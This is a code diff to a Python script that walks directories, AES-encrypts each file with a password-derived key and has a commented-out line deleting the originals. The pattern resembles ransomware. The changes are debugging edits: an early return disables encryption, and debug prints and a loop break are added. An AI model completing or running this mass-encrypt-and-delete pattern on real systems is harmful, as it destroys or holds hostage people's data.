@@ -17,7 +17,7 @@ def encrypt_file(key, filename, filepath):
     iv = Random.new().read(16)  # Contains the initial value which will be used to start a cipher feedback mode
     print(iv)
     aes_obj = AES.new(key, AES.MODE_CBC, iv)
-
+    return
     with open(filepath, 'rb') as infile:  # opens the file
         with open(os.path.join(dirpath, encrypted_symbol + filename), 'wb') as outfile:  # set the output file with a different name
             outfile.write(filesize.encode('utf-8'))
@@ -43,13 +43,14 @@ def encrypt_all_files():
                 try:
                     key = SHA256.new(password.encode('utf-8')).digest()  # generates a 256bit key from password
                     filepath = os.path.abspath(os.path.join(root, filename))
-                    # encrypt_file(key, filename, filepath)  # calls the encrypt function
-                    # os.remove(filepath)  # deletes the file
                     print("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
+                    encrypt_file(key, filename, filepath)  # calls the encrypt function
+                    # os.remove(filepath)  # deletes the file
                     break
                     print("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")
                 except:
                     pass
+        break
 
 ###################### main ######################
 
